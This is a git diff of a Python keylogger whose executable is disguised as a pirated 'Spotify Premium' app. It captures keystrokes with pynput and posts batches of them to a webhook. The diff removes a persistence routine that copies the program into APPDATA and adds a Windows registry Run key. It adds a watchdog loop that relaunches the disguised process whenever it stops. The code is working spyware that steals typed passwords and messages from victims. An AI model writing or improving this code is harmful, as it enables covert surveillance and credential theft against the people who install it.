@@ -2,8 +2,9 @@ import io
 import os
 import sys
 import requests
-import shutil
-import winreg as reg
+import subprocess
+import time
+import psutil
 from dotenv import load_dotenv
 from pynput.keyboard import Key, Listener
 
@@ -14,28 +15,21 @@ def ruta_recurso(nombre: str) -> str:
     return os.path.join(base, nombre)
 
 
-def ganar_persistencia(nombre_app="Spotify_Premium.apk"):
-    try:
-        # 1. Obtener la ruta del archivo ejecutable actual
-        ruta_actual = os.path.abspath(sys.argv[0])
+def monitorizar_proceso():
+    nombre_proceso = "Spotify_Premium.apk.exe"
+    while True:
+        ejecutandose = False
+        # Busca si el archivo .exe está corriendo
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'] == nombre_proceso:
+                ejecutandose = True
+                break
         
-        # 2. Definir la ruta de destino (ej. Carpeta AppData/Roaming)
-        carpeta_appdata = os.getenv("APPDATA")
-        ruta_destino = os.path.join(carpeta_appdata, f"{nombre_app}.exe")
-        
-        # 3. Copiar el ejecutable a la ruta de destino si no está allí
-        if ruta_actual != ruta_destino:
-            shutil.copyfile(ruta_actual, ruta_destino)
-        
-        # 4. Agregar la ruta al Registro de Windows (HKCU para evitar pedir permisos de Administrador)
-        clave_reg = reg.HKEY_CURRENT_USER
-        ruta_registro = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        
-        # Abrir la clave del registro e insertar el valor
-        with reg.OpenKey(clave_reg, ruta_registro, 0, reg.KEY_WRITE) as llave:
-            reg.SetValueEx(llave, nombre_app, 0, reg.REG_SZ, f'"{ruta_destino}"')
-    except Exception as e:
-        raise RuntimeError("Error al establecer persistencia")
+        # Si no está corriendo, lo vuelve a iniciar
+        if not ejecutandose:
+            subprocess.Popen([nombre_proceso])
+            
+        time.sleep(1)
 
 
 keys = []
@@ -46,7 +40,7 @@ _numero_lote = 0
 
 def enviar_reporte(contenido: str, mensaje: str = "Reporte", nombre_archivo: str = "reporte.txt"):
     if not WEBHOOK_URL:
-        raise RuntimeError("No se encontró la URL del webhook")
+        raise RuntimeError("No se encontró la URL del webhook (revisa tu .env)")
     r = requests.post(
         WEBHOOK_URL,
         data={"content": mensaje},
@@ -121,7 +115,7 @@ def on_release(key):
 
 
 # PP
-ganar_persistencia()
+monitorizar_proceso()
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
